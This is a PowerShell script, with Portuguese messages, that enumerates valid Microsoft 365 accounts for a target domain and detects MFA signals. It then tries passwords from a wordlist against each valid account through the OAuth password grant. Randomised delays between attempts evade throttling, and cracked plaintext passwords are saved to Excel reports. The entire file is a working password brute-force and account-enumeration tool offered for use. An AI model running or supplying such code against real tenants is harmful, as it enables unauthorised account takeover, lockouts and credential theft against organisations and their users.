param(
    [string]$Domain   = "empresa.com",
    [string]$UserList = ".\users.txt",
    [switch]$TestLogin,
    [Alias("nq")]
    [switch]$NoQuestion
    )

Write-Host "para usar rode o comando .\enum_pass_brute.ps1 -Domain empresa.com -UserList .\users.txt -TestLogin"

# =========================
# CONFIG
# =========================
$ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Azure CLI

# Verificar e instalar módulo MSAL.PS se necessário
if (!(Get-Module -ListAvailable -Name MSAL.PS)) {
    Write-Host "[+] Instalando módulo MSAL.PS..." -ForegroundColor Cyan
    Install-Module -Name MSAL.PS -Force -Scope CurrentUser -AllowClobber
}

# Importar módulo MSAL.PS
Import-Module MSAL.PS -ErrorAction Stop

if (!(Get-Module -ListAvailable -Name ImportExcel)) {
    Write-Host "[+] Instalando modulo ImportExcel..." -ForegroundColor Cyan
    Install-Module -Name ImportExcel -Force -Scope CurrentUser -AllowClobber
}

Import-Module ImportExcel -ErrorAction Stop

if (!(Test-Path $UserList)) {
    Write-Host "[ERRO] Wordlist não encontrada: $UserList" -ForegroundColor Red
    exit
}

$timestamp  = Get-Date -Format "yyyyMMdd_HHmmss"
$outputFile = "enum_ms_$timestamp.xlsx"

$url = "https://login.microsoftonline.com/common/GetCredentialType"

$valid   = 0
$invalid = 0
$unknown = 0

Write-Host "`n[+] Iniciando enumeração..." -ForegroundColor Cyan

$loginStatusColors = @{
    "SENHA_INCORRETA"            = "Yellow"
    "LOGIN_OK MAS MFA REQUERIDO" = "DarkYellow"
    "LOGIN_OK"                   = "Green"
    "CONTA_BLOQUEADA"            = "Red"
    "CONTA_EM_OUTRO_TENANT"      = "Yellow"
    "USUARIO_NAO_ENCONTRADO"     = "DarkGray"
    "ERRO"                       = "DarkGray"
}


$resultDir = "enum_resultados"
New-Item -ItemType Directory -Path $resultDir -Force | Out-Null

$fileValidos         = Join-Path $resultDir "validos.xlsx"
$fileSenhaIncorreta  = Join-Path $resultDir "senha_incorreta.xlsx"
$fileMfaRequerido    = Join-Path $resultDir "mfa_requerido.xlsx"
$fileBloqueados      = Join-Path $resultDir "bloqueados.xlsx"
$fileOutros          = Join-Path $resultDir "outros.xlsx"
$fileResumo          = Join-Path $resultDir "resumo.xlsx"

$allResults = New-Object System.Collections.Generic.List[object]
$validosResults = New-Object System.Collections.Generic.List[object]
$senhaIncorretaResults = New-Object System.Collections.Generic.List[object]
$mfaRequeridoResults = New-Object System.Collections.Generic.List[object]
$bloqueadosResults = New-Object System.Collections.Generic.List[object]
$outrosResults = New-Object System.Collections.Generic.List[object]


function no_question {
    param(
        [switch]$NoQuestion
    )
    return $NoQuestion.IsPresent
}

function Save-Result {
    param (
        [pscustomobject]$Result,
        [string]$LoginStatus
    )

    $script:allResults.Add($Result) | Out-Null

    switch ($LoginStatus) {
        "LOGIN_OK" {
            $script:validosResults.Add($Result) | Out-Null
        }
        "SENHA_INCORRETA" {
            $script:senhaIncorretaResults.Add($Result) | Out-Null
        }
        "LOGIN_OK MAS MFA REQUERIDO" {
            $script:mfaRequeridoResults.Add($Result) | Out-Null
        }
        "CONTA_BLOQUEADA" {
            $script:bloqueadosResults.Add($Result) | Out-Null
        }
        default {
            $script:outrosResults.Add($Result) | Out-Null
        }
    }
}

function Export-XlsxResult {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [object[]]$Data,

        [string]$WorksheetName = "Resultados"
    )

    if (Test-Path $Path) {
        Remove-Item -Path $Path -Force
    }

    if ($Data.Count -eq 0) {
        $Data = @([pscustomobject]@{
            Mensagem = "Sem resultados"
        })
    }

    $Data | Export-Excel -Path $Path -WorksheetName $WorksheetName -AutoSize -BoldTopRow -FreezeTopRow
}


# =========================
# LOOP PRINCIPAL
# =========================

foreach ($user in Get-Content $UserList) {

    if ([string]::IsNullOrWhiteSpace($user)) { continue }

    $email = "$user@$Domain"
    $body  = @{ Username = $email } | ConvertTo-Json
    $tentativasLoginRegistradas = 0

    try {
        # =========================
        # ENUMERAÇÃO / EXISTÊNCIA
        # =========================
        $response = Invoke-RestMethod -Method POST `
                                     -Uri $url `
                                     -Body $body `
                                     -ContentType "application/json"

        $status      = "DESCONHECIDO"
        $mfaStatus   = "NAO_DETECTADO"
        $loginStatus = "NAO_TESTADO"

        if ($response.IfExistsResult -eq 0) {
            $status = "VALIDO"
            $valid++
        }
        elseif ($response.IfExistsResult -eq 1) {
            $status = "INVALIDO"
            $invalid++
        }
        else {
            $unknown++
        }

        # =========================
        # MFA (SINAIS)
        # =========================
        if ($response.PSObject.Properties.Name -contains "IsMfaRegistered" -and $response.IsMfaRegistered) {
            $mfaStatus = "MFA_REGISTRADO"
        }
        elseif ($response.PSObject.Properties.Name -contains "EstsProperties" -and $response.EstsProperties.MfaRequired) {
            $mfaStatus = "MFA_REQUERIDO"
        }

        if ($response.PSObject.Properties.Name -contains "Credentials") {
            foreach ($cred in $response.Credentials) {
                if ($cred.Type -in @("PhoneApp","OneWaySms","TwoWaySms")) {
                    $mfaStatus = "MFA_DETECTADO"
                    break
                }
            }
        }

        if ($response.PSObject.Properties.Name -contains "ThrottleStatus" -and $response.ThrottleStatus -eq 1) {
            $mfaStatus = "MFA_POSSIVEL"
        }

        # =========================
        # DECISÃO: TESTAR LOGIN
        # =========================
        $doLogin = $false

        if ($TestLogin -and $status -eq "VALIDO") {

            if (no_question -NoQuestion $NoQuestion) {
                $doLogin = $true
            }
            else {
                Write-Host "`n----------------------------------------`n"
                Write-Host "[?] Testar login para $email ?" -ForegroundColor Yellow
                $choice = Read-Host "[y/N]"
                if ($choice -eq "y") { $doLogin = $true }
            }
        }
        # =========================
        # LOGIN (SE AUTORIZADO)
        # =========================
        if ($doLogin) {
            Write-Host "`n----------------------------------------`n"
            
            # Caminho do ficheiro com as senhas (uma por linha)
            $caminhoSenhas = "senhas.txt" 

            if (Test-Path $caminhoSenhas) {
                $listaSenhas = Get-Content $caminhoSenhas
                
                # Obter o TenantID uma única vez antes do loop para ser mais rápido
                try {
                    $tenantResponse = Invoke-RestMethod `
                        -Uri "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration" `
                        -ErrorAction Stop
                    $tenantId = $tenantResponse.token_endpoint.Split('/')[3]
                    $tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
                } catch {
                    Write-Host "Erro ao resolver domínio: $($_.Exception.Message)" -ForegroundColor Red
                    $listaSenhas = @() # Impede a entrada no loop
                }

                foreach ($plainPass in $listaSenhas) {
                    if ([string]::IsNullOrWhiteSpace($plainPass)) { continue }

                    $pararTesteSenhas = $false
                    Write-Host "A testar senha: $plainPass" -ForegroundColor Cyan

                    try {
                        $body = @{
                            client_id  = $ClientId
                            scope      = "https://graph.microsoft.com/.default"
                            username   = $email
                            password   = $plainPass
                            grant_type = "password"
                        }

                        $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Body $body -ErrorAction Stop

                        if ($tokenResponse.access_token) {
                            $loginStatus = "LOGIN_OK"
                            $pararTesteSenhas = $true
                            $objResultado = [pscustomobject]@{
                                Email  = $email
                                Status = $loginStatus
                                Senha  = $plainPass  # <-- Esta é a nova coluna
                                Data   = (Get-Date -Format "dd/MM/yyyy HH:mm:ss")
                            }
                            Write-Host "✅ Sucesso para: $email" -ForegroundColor Green
                            Save-Result -Result ([pscustomobject]@{
                                DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                                Email       = $email
                                Status      = $status
                                MFA         = $mfaStatus
                                LoginStatus = $loginStatus
                                Senha       = $plainPass
                            }) -LoginStatus $loginStatus
                            $tentativasLoginRegistradas++
                            break # Para o loop se encontrar a senha correta
                        }
                    }
                    catch {
                        $errorResponse = $_.ErrorDetails.Message
                        if (-not $errorResponse) { $errorResponse = $_.Exception.Message }

                        try {
                            $errorJson = $errorResponse | ConvertFrom-Json
                            $errorDesc = $errorJson.error_description

                            switch -Regex ($errorDesc) {
                                "AADSTS50126" {
                                    $loginStatus = "SENHA_INCORRETA"
                                }
                                "AADSTS50076|AADSTS50079" {
                                    $loginStatus = "LOGIN_OK MAS MFA REQUERIDO"
                                    if ($mfaStatus -eq "NAO_DETECTADO") { $mfaStatus = "MFA_REQUERIDO" }
                                    $pararTesteSenhas = $true
                                    break # Interrompe o loop pois a senha está correta, mas barrou no MFA
                                }
                                "AADSTS50053" { 
                                    $loginStatus = "CONTA_BLOQUEADA"
                                    $pararTesteSenhas = $true
                                    break # Para de tentar se a conta for bloqueada
                                }
                                "AADSTS50034" { 
                                    $loginStatus = "USUARIO_NAO_ENCONTRADO" 
                                    $pararTesteSenhas = $true
                                    break # Para de tentar se o email não existir
                                }
                                default { $loginStatus = "ERRO" }
                            }
                        }
                        catch {
                            $loginStatus = "ERRO"
                        }
                        
                                # Exibe o status da tentativa atual
                        Write-Host "Status para [$plainPass]: $loginStatus" -ForegroundColor Yellow

                        Save-Result -Result ([pscustomobject]@{
                            DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                            Email       = $email
                            Status      = $status
                            MFA         = $mfaStatus
                            LoginStatus = $loginStatus
                            Senha       = $plainPass
                        }) -LoginStatus $loginStatus
                        $tentativasLoginRegistradas++

                        # Só faz o sleep se NÃO tiver acertado a senha (evita esperar à toa no final)
                        if ($loginStatus -eq "SENHA_INCORRETA" -or $loginStatus -eq "ERRO") {
                            $tempoAleatorio = Get-Random -Minimum 1 -Maximum 3 
                            Write-Host "Aguardando $tempoAleatorio segundos..." -ForegroundColor Gray
                            Start-Sleep -Seconds $tempoAleatorio
                        }

                        if ($pararTesteSenhas) {
                            break
                        }
                    } # Fim do foreach Senhas
                }
            }
        } # Fim do foreach Emails

        # =========================
        # OUTPUT
        # =========================
        Write-Host "$email -> " -ForegroundColor DarkGray -NoNewline

        $statusColor = if ($status -eq "VALIDO") { "Yellow" } else { "DarkGray" }
        Write-Host "$status | " -ForegroundColor $statusColor -NoNewline

        $mfaColor = switch ($mfaStatus) {
            "MFA_REQUERIDO"  { "Blue" }
            "MFA_DETECTADO" { "Yellow" }
            default         { "DarkGray" }
        }
        Write-Host "MFA: $mfaStatus | " -ForegroundColor $mfaColor -NoNewline

        $loginColor = $loginStatusColors[$loginStatus]
        if (-not $loginColor) { $loginColor = "DarkGray" }
        Write-Host "LOGIN: $loginStatus" -ForegroundColor $loginColor

        if ($tentativasLoginRegistradas -eq 0) {
            $result = [pscustomobject]@{
                DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                Email       = $email
                Status      = $status
                MFA         = $mfaStatus
                LoginStatus = $loginStatus
                Senha       = ""
            }

            Save-Result -Result $result -LoginStatus $loginStatus
        }
    }
    catch {
        Write-Host "$email -> ERRO" -ForegroundColor Red

        Save-Result -Result ([pscustomobject]@{
            DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Email       = $email
            Status      = "ERRO"
            MFA         = "NAO_DETECTADO"
            LoginStatus = "ERRO"
            Senha       = ""
        }) -LoginStatus "ERRO"
    }

    Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 900)
}

# =========================
# RESUMO
# =========================

$summary = @"
=========================
RESUMO
=========================
VALIDOS:       $valid
INVALIDOS:     $invalid
DESCONHECIDOS: $unknown
=========================
"@

Write-Host "`n$summary" -ForegroundColor Cyan

$summaryData = @(
    [pscustomobject]@{ Metrica = "VALIDOS"; Valor = $valid },
    [pscustomobject]@{ Metrica = "INVALIDOS"; Valor = $invalid },
    [pscustomobject]@{ Metrica = "DESCONHECIDOS"; Valor = $unknown }
)

if (Test-Path $outputFile) {
    Remove-Item -Path $outputFile -Force
}

$masterResults = $allResults.ToArray()
if ($masterResults.Count -eq 0) {
    $masterResults = @([pscustomobject]@{
        Mensagem = "Sem resultados"
    })
}

$masterResults | Export-Excel -Path $outputFile -WorksheetName "Resultados" -AutoSize -BoldTopRow -FreezeTopRow
$summaryData | Export-Excel -Path $outputFile -WorksheetName "Resumo" -Append -AutoSize -BoldTopRow -FreezeTopRow

Export-XlsxResult -Path $fileValidos -Data $validosResults.ToArray()
Export-XlsxResult -Path $fileSenhaIncorreta -Data $senhaIncorretaResults.ToArray()
Export-XlsxResult -Path $fileMfaRequerido -Data $mfaRequeridoResults.ToArray()
Export-XlsxResult -Path $fileBloqueados -Data $bloqueadosResults.ToArray()
Export-XlsxResult -Path $fileOutros -Data $outrosResults.ToArray()
Export-XlsxResult -Path $fileResumo -Data $summaryData -WorksheetName "Resumo"

Write-Host "[+] Arquivo geral XLSX: $outputFile" -ForegroundColor Green
Write-Host "[+] Resultados XLSX em: $resultDir" -ForegroundColor Green
